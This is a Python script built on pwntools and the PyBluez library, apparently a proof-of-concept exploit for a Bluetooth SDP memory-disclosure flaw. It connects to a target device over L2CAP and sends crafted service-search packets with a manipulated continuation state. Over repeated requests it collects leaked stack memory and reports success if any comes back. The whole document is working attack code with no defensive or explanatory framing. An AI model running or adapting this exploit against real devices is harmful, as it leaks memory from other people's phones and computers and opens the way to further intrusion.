from pwn import *
import bluetooth

def packet(service, continuation_state):
    pkt = '\x02\x00\x00'
    pkt += p16(7 + len(continuation_state)).decode('latin-1')
    pkt += '\x35\x03\x19'
    pkt += p16(service).decode('latin-1')
    pkt += '\x01\x00'
    pkt += continuation_state
    return pkt

def exploit(target=None):
    service_long = 0x0100
    service_short = 0x0001
    mtu = 50
    n = 30

    p = log.progress('Exploit')
    p.status('Creating L2CAP socket')

    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bluetooth.set_l2cap_mtu(sock, mtu)
    context.endian = 'big'

    p.status('Connecting to target')
    try:
        sock.connect((target, 1))
        p.status('Sending packet 0')
        sock.send(packet(service_long, '\x00'))
        data = sock.recv(mtu).decode('latin-1')
        if data[-3] != '\x02':
            sock.close()
            return False
    except bluetooth.btcommon.BluetoothError as e:
        sock.close()
        return False

    stack = ''

    for i in range(1, n):
        p.status('Sending packet %d' % i)
        sock.send(packet(service_short, data[-3:]))
        data = sock.recv(mtu).decode('latin-1')
        stack += data[9:-3]

    sock.close()
    p.success('Done')
    if len(stack) > 0:
        return True
    return False


